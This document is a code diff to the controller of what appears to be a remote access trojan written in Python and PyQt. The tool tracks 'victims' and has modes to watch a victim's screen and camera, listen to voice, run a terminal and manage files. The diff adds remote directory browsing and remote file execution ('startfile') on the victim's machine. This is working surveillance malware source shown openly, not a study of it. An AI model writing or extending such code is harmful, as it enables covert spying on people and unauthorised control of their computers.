@@ -19,7 +19,7 @@ from victim import Victim
 
 # types: default, watch_screen, watch_camera, terminal, file_manager, listen_voice
 
-IP ="192.168.1.25"
+IP ="192.168.1.50"
 PORT = 123
 victim_screens = {"watch_screen": {}, "watch_camera": {}, "terminal": {}, "file_manager": {}, "listen_voice": {}}
 victims = {"client": {}, "watch_screen": {}, "watch_camera": {}, "terminal": {}, "file_manager": {}, "listen_voice": {}}
@@ -153,6 +153,26 @@ class WatchCamera(Thread):
         self.start()
 
 
+class FMListWidgetItem(QListWidgetItem):
+    def __init__(self, path:str, item_type: str, size: int):
+        super().__init__()
+        self.item_type = item_type
+        self.path = path
+        self.size = size
+        if path.count("\\") > 1:
+            self.setText(path.split("\\")[-1])
+        else:
+            self.setText(path+"\t"+str(size))
+        
+        if item_type == "dir":
+            self.setIcon(QIcon(FileManager.file_icons["folder"]))
+        else:
+            ext = path.split(".")[-1]
+            self.setIcon(QIcon(FileManager.file_icons.get(ext, FileManager.file_icons["file"])))
+        
+        # self.setFlags(self.flags() | Qt.ItemIsUserCheckable)
+        # self.setCheckState(Qt.Unchecked)
+
 class FileManager(QWidget):
     file_icons = {
         "file": "C:/Users/ertu1/Desktop/blank/resources/file.ico",
@@ -166,11 +186,12 @@ class FileManager(QWidget):
     def buildGui(self):
         self.setWindowTitle("File Manager of "+self.victim.name)
         g_lay = QGridLayout(self)
-        self.remoteList = QListWidget()
+        self.remote_list = QListWidget()
         self.locale_list = QListWidget()
         # self.remoteList.setSelectionMode()
         # self.localList.setSelectionMode(QAbstractItemView.Ex)
-        # self.remoteList.doubleClicked.connect(self.remoteListItemDoubleClicked)
+        
+        self.remote_list.doubleClicked.connect(self.remote_list_item_double_clicked)
         self.locale_list.doubleClicked.connect(self.locale_list_item_double_clicked)
 
         self.bufferEdit = QSpinBox()
@@ -202,7 +223,7 @@ class FileManager(QWidget):
         # remoteDeleteButton.clicked.connect(self.remoteDelete)
 
         g_lay.addWidget(self.remote_dir_label, 1, 2)
-        g_lay.addWidget(self.remoteList, 2, 2)
+        g_lay.addWidget(self.remote_list, 2, 2)
         g_lay.addWidget(remoteBackButton, 3, 2)
         g_lay.addWidget(downloadButton, 4, 2)
         g_lay.addWidget(remoteExecuteButton, 5, 2)
@@ -257,10 +278,28 @@ class FileManager(QWidget):
             while len(data) < data_length:
                 data += self.victim.client.recv(data_length - len(data))
             data = pickle.loads(data)
-            self.remoteList.clear()
+            self.remote_list.clear()
             for item in data:
-                item_widget = QListWidgetItem(QIcon(self.file_icons["folder"]), item)
-                self.remoteList.addItem(item_widget)
+                path = item["path"]
+                size = item["size"]
+                type = item["type"]
+                item_widget = FMListWidgetItem(path=path, item_type=type, size=size)
+                self.remote_list.addItem(item_widget)
+        elif command == "listdir":
+            path = kwargs["path"]
+            self.victim.send_data(pickle.dumps({"command":"listdir","path":path}))
+            data_length = int(self.victim.client.recv(10).decode("utf-8").lstrip("0"))
+            data = b''
+            while len(data) < data_length:
+                data += self.victim.client.recv(data_length - len(data))
+            data = pickle.loads(data)
+            for item in data:
+                path = item["path"]
+                item_type = item["type"]
+                size = item["size"]
+                item_widget = FMListWidgetItem(path=path, item_type=item_type, size=size)
+                self.remote_list.clear()
+                self.remote_list.addItem(item_widget)
 
     def locale_command(self, command,**kwargs):
         if command == "disks":
@@ -302,12 +341,22 @@ class FileManager(QWidget):
                 item = QListWidgetItem(icon, item_text)
                 self.locale_list.addItem(item)
 
+    def remote_list_item_double_clicked(self):
+        selected_item = self.remote_list.selectedItems()[0]
+        selected_text = selected_item.text()
+        if (len(selected_text.split("\t"))) > 1 and "-1" in selected_text.split("\t")[1]:
+            print("size -1")
+            return
+        path = os.path.join(self.remote_dir_label.text(), selected_text.split("\t")[0])
+        if selected_item.item_type == "dir":
+            self.remote_command("listdir",path=path)
+        else:
+            self.remote_command("startfile",path=path)
+    
     def locale_list_item_double_clicked(self):
         selected_text = self.locale_list.selectedItems()[0].text()
         if (len(selected_text.split("\t"))) > 1 and "-1" in selected_text.split("\t")[1]:
             return
-        print("locale dir label text:"+self.locale_dir_label.text()+".")
-        print("selected text:"+selected_text+".")
         if self.locale_dir_label.text() == "":
             path = selected_text
         else:
